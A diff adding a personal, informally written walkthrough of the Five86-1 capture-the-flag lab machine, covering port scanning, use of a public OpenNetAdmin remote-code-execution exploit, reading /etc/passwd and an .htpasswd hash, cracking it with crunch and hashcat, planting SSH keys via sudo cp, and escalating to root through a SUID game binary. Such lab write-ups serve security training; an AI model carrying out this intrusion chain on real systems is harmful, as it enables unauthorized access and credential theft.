@@ -1,0 +1,209 @@
+ip  192.168.56.122
+
+nmap basic port scan
+Nmap scan report for 192.168.56.122
+Host is up (0.000080s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+10000/tcp open  snet-sensor-mgmt
+MAC Address: 08:00:27:30:F8:24 (Oracle VirtualBox virtual NIC)
+
+nmap intense
+
+Nmap scan report for 192.168.56.122
+Host is up (0.00053s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)
+|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)
+|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/ona
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+MAC Address: 08:00:27:30:F8:24 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+i just hit robots.txt on port 80
+http://five86.local/robots.txt
+
+an found a /ona disallow dir
+when i surf it 
+there was a webmin runnuning 
+then i got my guest username
+i though to change it with admin and loged in 
+with admin admin
+
+i saw the version of the webmin explore on google find the remote code execution
+
+OpenNetAdmin 18.1.1 - Remote Code Execution 
+
+https://github.com/amriunix/ona-rce
+
+
+after exploitig
+got a shell
+sh$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
+moss:x:1001:1001:Maurice Moss:/home/moss:/bin/bash
+roy:x:1002:1002:Roy Trenneman:/home/roy:/bin/bash
+jen:x:1003:1003:Jen Barber:/home/jen:/bin/bash
+richmond:x:1004:1004:Richmond Avenal:/home/richmond:/bin/bash
+douglas:x:1005:1005:Douglas Reynholm:/home/douglas:/bin/bash
+Debian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin
+sh$ 
+
+
+after a lot more enumeration i got a hash
+find / -user 'www-data' | grep -v '\/proc'
+
+cat /var/www/.htpasswd
+
+this .htpasswd previnting the
+ip/report dir on web
+
+
+douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1
+
+
+username - douglas and more i found in passwd
+
+# To make things slightly less painful (a standard dictionary will likely fail),
+# use the following character set for this 10 character password: aefhrt 
+
+used crunch to buid the wordlist
+crunch 10 10 aefhrt -o wordlist.txt
+
+
+
+
+Hashcat - like Shudarshan chakra
+hashcat -a 0 -m 1600 hash.txt wordlist.txt
+
+after 25 minites of hashcut runnin i got the password 
+
+apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1:fatherrrrr
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
+Hash.Target......: $apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1
+Time.Started.....: Thu May  7 15:41:03 2020 (23 mins, 51 secs)
+Time.Estimated...: Thu May  7 16:04:54 2020 (0 secs)
+Guess.Base.......: File (wordlist.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    14366 H/s (8.70ms) @ Accel:128 Loops:125 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 21709824/60466176 (35.90%)
+Rejected.........: 0/21709824 (0.00%)
+Restore.Point....: 21708800/60466176 (35.90%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
+Candidates.#1....: fatherhref -> fathetffht
+
+Started: Thu May  7 15:40:03 2020
+Stopped: Thu May  7 16:04:56 2020
+root@saimson:~/Desktop/.machine/five86# 
+
+just lande on ssh with douglas
+
+
+ek common procedure jo m follow krta hu:
+1. take interactive shell
+2. check suid binaries
+3. check files on which we have write permissions
+4. idhr udhr ghumo fireo thoda..agar kch unusual sa dikhe to phr uske piche jao
+
+
+so the douglas has a sudo to use copy command
+
+so i copyied my .ssh/id_rsa.pub /tmp/authorized_keys my local tmp
+
+chmod 777 authorized_keys
+
+sudo -u jen /bin/cp authorized_keys /home/jen/.ssh
+
+cp id_rsa /tmp
+chmod id_rsa 600
+
+ssh -i authorized_keys jen@localhost
+
+got the jen's shell
+
+cat /var/mail/jen
+
+
+Hi Jen,
+
+As you know, I'll be on the "customer service" course on Monday due to that incident on Level 4 with the accounts people.
+
+But anyway, I had to change Moss's password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!
+
+Moss will understand (ha ha ha ha).
+
+Tanks,
+Roy
+
+got the password of moss
+
+moss@five86-1:~/.games$ ./upyourgame 
+Would you like to play a game? yes
+
+Could you please repeat that? yes
+
+Nope, you'll need to enter that again. yes
+
+You entered: No.  Is this correct? no
+
+We appear to have a problem?  Do we have a problem? no
+
+Made in Britain.
+# id
+uid=0(root) gid=1001(moss) groups=1001(moss)
+# whoami
+root
+# cat flag.txt	
+cat: flag.txt: No such file or directory
+# pwd
+/home/moss/.games
+# cat /root/flag.txt
+8f3b38dd95eccf600593da4522251746
+# 
+
+
